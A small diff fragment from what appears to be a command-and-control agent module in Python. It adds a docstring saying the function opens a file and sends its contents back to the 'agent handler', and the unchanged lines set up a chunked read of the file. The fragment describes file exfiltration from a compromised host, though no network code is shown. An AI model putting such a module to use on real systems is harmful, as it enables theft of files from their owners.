@@ -5,6 +5,8 @@ from base64 import b64encode
 import time
 
 def main(dropper, args=None):
+    """Open a file and send its contents back to the agent handler"""
+
     print("Downloading : {}".format(args))
     rd_sz = 16384   # 16 times more htan before!
     if os.path.exists(args):
